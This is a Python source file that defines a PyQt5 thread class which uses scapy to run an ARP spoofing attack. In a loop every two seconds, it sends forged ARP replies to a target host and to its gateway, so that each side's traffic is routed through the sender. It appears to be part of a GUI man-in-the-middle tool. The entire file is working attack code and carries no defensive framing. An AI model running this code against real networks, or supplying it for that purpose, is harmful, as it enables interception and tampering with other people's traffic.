from PyQt5.QtCore import QThread, pyqtSignal
from scapy.all import Ether, ARP, sendp, send
import time
import random

class SpoofThread(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, target_ip, target_mac, gateway_ip, gateway_mac, stop_event):
        super().__init__()
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.stop_event = stop_event
    # version 1
    def run(self):
        arp_reply_target = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.target_mac)
        ether_target = Ether(dst=self.target_mac) 

        arp_reply_gateway = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)
        ether_gateway = Ether(dst=self.gateway_mac)  
      
        self.log_signal.emit(f"Started spoofing {self.target_ip} and gateway {self.gateway_ip}.")

        while not self.stop_event.is_set():
            try:
                packet = ether_target / arp_reply_target
                packet.show()
                sendp(ether_target / arp_reply_target, verbose=False)
                sendp(ether_gateway / arp_reply_gateway, verbose=False)
                time.sleep(2)
            except Exception as e:
                self.log_signal.emit(f"Error during spoofing: {e}")
                break

        self.log_signal.emit(f"Stopped spoofing {self.target_ip} and gateway {self.gateway_ip}.")